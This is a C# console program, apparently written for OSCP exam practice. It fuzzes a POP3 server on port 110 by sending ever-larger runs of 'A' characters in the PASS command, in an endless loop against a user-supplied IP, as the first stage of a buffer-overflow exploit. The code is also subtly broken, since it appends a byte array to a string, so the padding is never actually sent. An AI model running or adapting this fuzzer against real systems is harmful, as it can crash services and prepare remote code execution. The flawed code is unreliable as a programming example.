using System;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;

namespace OSCP_Exploit.py
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));

            }
            Start:
            Console.WriteLine("Supply the IP address /n hostname should be in IP Address format");
            string subIP = Console.ReadLine();

            int port = 110; //change this if needed

            int test_buffer_overflow = 100;

            char test_payload = 'A';
            string test_buffer_payload = new string(test_payload, test_buffer_overflow);

            Console.WriteLine($"Sending {test_buffer_payload.Length} bytes");

            Console.WriteLine($"Testing if {subIP} on port:{port} is vulnerable to fuzzing manuenvers");

            IPEndPoint rhost = new IPEndPoint(IPAddress.Parse(subIP), port);
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                sock.Connect(rhost);
                sock.Close();

                int buffer_overflow = 100;

                while (true)
                {

                    char payload = 'A';
                    string buffer_payload = new string(payload, buffer_overflow);

                    Console.WriteLine($"Sending {buffer_payload.Length} bytes");

                    Socket nsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    nsock.Connect(rhost);
                    byte[] buffer = new byte[nsock.ReceiveBufferSize];
                    string username = "User Zarrius \r\n";
                    string password = "Pass";
                    string returnnew = "\r\n";
                    string quit = "Quit\r\n";
                    byte[] byte_username = Encoding.ASCII.GetBytes(username);
                    byte[] payload_bytes = Encoding.ASCII.GetBytes(buffer_payload);
                    byte[] fullpayload = Encoding.ASCII.GetBytes(password + payload_bytes + returnnew);
                    byte[] byte_quit = Encoding.ASCII.GetBytes(quit);
                    nsock.Receive(buffer);
                    nsock.Send(byte_username);
                    nsock.Receive(buffer);
                    nsock.Send(fullpayload);
                    nsock.Send(byte_quit);
                    nsock.Close();
                    buffer_overflow += 100;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error connecting to socket at{e}");
                goto Start;
            }

        }

    }
}
